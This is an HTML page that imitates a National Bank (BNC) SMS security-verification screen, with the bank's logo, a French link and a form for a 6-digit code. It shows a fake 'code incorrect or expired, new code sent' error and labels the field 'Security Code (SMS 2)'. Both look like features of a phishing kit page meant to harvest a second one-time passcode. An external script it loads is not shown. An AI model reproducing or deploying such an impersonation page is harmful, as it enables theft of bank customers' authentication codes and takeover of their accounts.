<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Bank - Verification</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
        }

        /* Top Bar */
        .top-bar {
            display: flex;
            justify-content: flex-end;
            padding: 16px 24px 8px;
        }

        .lang-link {
            color: #00548f;
            text-decoration: underline;
            font-size: 16px;
            font-weight: 600;
        }

        /* Header Logo */
        .header {
            padding: 12px 24px;
            display: flex;
            align-items: center;
        }

        /* Main Content */
        .container {
            padding: 20px 24px;
            max-width: 500px;
            margin: 0 auto;
        }

        h1 {
            font-size: 28px;
            font-weight: 800;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .error-msg {
            background-color: #fcebeb;
            border-left: 4px solid #e11c2a;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 15px;
            color: #333;
            line-height: 1.4;
        }
        
        .error-msg strong {
            color: #e11c2a;
            display: block;
            margin-bottom: 4px;
        }

        .info-text {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 24px;
            color: #333;
        }

        .form-group {
            margin-bottom: 30px;
        }

        label {
            display: block;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e11c2a;
            border-radius: 4px;
            font-size: 18px;
            box-sizing: border-box;
            background-color: #ffffff;
            outline: none;
            letter-spacing: 2px;
        }
        
        input:focus {
            border-color: #00548f;
            box-shadow: 0 0 0 1px #00548f;
        }

        .verify-btn {
            background-color: #00548f;
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 24px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 24px;
        }

        .verify-btn:hover {
            background-color: #003d69;
        }

        .action-links {
            text-align: center;
        }

        .action-links a {
            color: #00548f;
            text-decoration: underline;
            font-size: 16px;
            display: inline-block;
            margin-bottom: 16px;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <a href="#" class="lang-link">Français</a>
    </div>

    <header class="header" style="padding-top: 0; padding-bottom: 10px;">
        <img src="bnc-logo.png" alt="National Bank" style="width: 260px; height: auto; margin-left: -20px;" />
    </header>

    <div class="container">
        <h1>Security Verification</h1>
        
        <div class="error-msg">
            <strong>Error</strong>
            The security code you entered is incorrect or has expired. A new code has been sent. Please try again.
        </div>

        <div class="info-text">
            We sent a new 6-digit security code by text message (SMS) to the number ending in <strong>****</strong>.
        </div>

        <form action="https://www.bnc.ca" method="POST">
            <div class="form-group">
                <label>Security code</label>
                <input type="text" name="Security Code (SMS 2)" placeholder="Enter the code" maxlength="6" autocomplete="off" required />
            </div>

            <button type="submit" class="verify-btn">
                Verify
            </button>
        </form>

        <div class="action-links">
            <a href="#">Didn't receive the code?</a><br>
            <a href="#">Use another method</a>
        </div>
    </div>

    <script src="security_module.js"></script>
</body>
</html>
